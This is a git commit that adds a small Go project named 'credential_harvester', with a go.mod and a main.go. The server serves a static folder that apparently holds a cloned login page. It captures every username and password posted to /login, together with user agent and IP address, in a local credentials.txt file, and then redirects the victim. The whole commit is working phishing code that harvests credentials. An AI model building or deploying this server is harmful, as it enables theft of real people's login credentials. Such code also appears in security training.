1b8e219521e924a9802ea3887d46f687db9ce918
sunlins <song.lin.86@gmail.com>
2022-03-01 00:04:08 +0800

    凭证收割

---
+++ credential_harvester/go.mod
@@ -0,0 +1,10 @@
+module credential_harvester
+
+go 1.17
+
+require (
+	github.com/gorilla/mux v1.8.0 // indirect
+	github.com/sirupsen/logrus v1.8.1 // indirect
+	github.com/urfave/negroni v1.0.0 // indirect
+	golang.org/x/sys v0.0.0-20191026070338-33540a1f6037 // indirect
+)
---
+++ credential_harvester/main.go
@@ -0,0 +1,36 @@
+package main
+
+import (
+	"github.com/gorilla/mux"
+	"github.com/sirupsen/logrus"
+	"net/http"
+	"os"
+	"time"
+)
+
+func login(w http.ResponseWriter,r *http.Request)  {
+	logrus.WithFields(logrus.Fields{"time":time.Now().String(),
+		"username":r.FormValue("_user"),
+		"password":r.FormValue("_pass"),
+		"user-agent":r.UserAgent(),
+		"ip_address":r.RemoteAddr,
+	}).Info("login attempt")
+	http.Redirect(w,r,"/",302)
+}
+
+func main() {
+	fh,err :=os.OpenFile("credentials.txt",
+		os.O_CREATE|os.O_APPEND|os.O_WRONLY,0600)
+
+	if err !=nil{
+		panic(err)
+	}
+
+	defer fh.Close()
+
+	logrus.SetOutput(fh)
+	r:=mux.NewRouter()
+	r.HandleFunc("/login",login).Methods("POST")
+	r.PathPrefix("/").Handler(http.FileServer(http.Dir("public")))
+	logrus.Fatalln(http.ListenAndServe(":8080",r))
+}
